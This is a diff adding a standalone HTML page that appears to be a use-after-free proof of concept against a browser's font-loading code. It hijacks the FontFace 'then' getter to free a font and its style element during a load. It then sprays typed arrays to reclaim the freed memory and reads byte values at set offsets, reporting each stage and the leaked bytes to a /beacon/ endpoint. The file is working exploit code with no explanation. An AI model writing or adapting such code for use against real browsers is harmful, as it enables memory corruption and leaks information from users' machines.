@@ -1,0 +1,41 @@
+<!doctype html><meta charset="utf-8"><title>uaf30</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+var FILL=1, styleEl=null, fired=false, keep=[];
+function setup(){
+  var A=new FontFace('g0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded;
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: h0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U30-SETUP');
+  fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (fired) return undefined;
+      fired=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      keep=[];
+      for (var i=0;i<8;i++){ var u=new Uint8Array(160); u.fill(FILL); keep.push(u); }
+      b('U30-SPRAY-FILL-'+FILL);
+      try { document.fonts.check('1em h0'); } catch(e){}
+      b('U30-CHECK-RETURNED');
+      for (var i=0;i<keep.length;i++){
+        var u=keep[i];
+        b('U30-POST-b'+i+'-0:'+hex8(u,0)+'-8:'+hex8(u,8)+'-50:'+hex8(u,0x50)+'-58:'+hex8(u,0x58)+'-90:'+hex8(u,0x90)+'-98:'+hex8(u,0x98));
+      }
+      return undefined;
+    },
+    set:function(){}
+  });
+  b('U30-LOAD-CALLED');
+  document.fonts.load('1em g0, h0','AB').then(function(){ b('U30-RESOLVED'); }, function(){ b('U30-REJECTED'); });
+  setTimeout(function(){ b('U30-T400-ALIVE'); },400);
+}
+function run(){ b('U30-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></body>
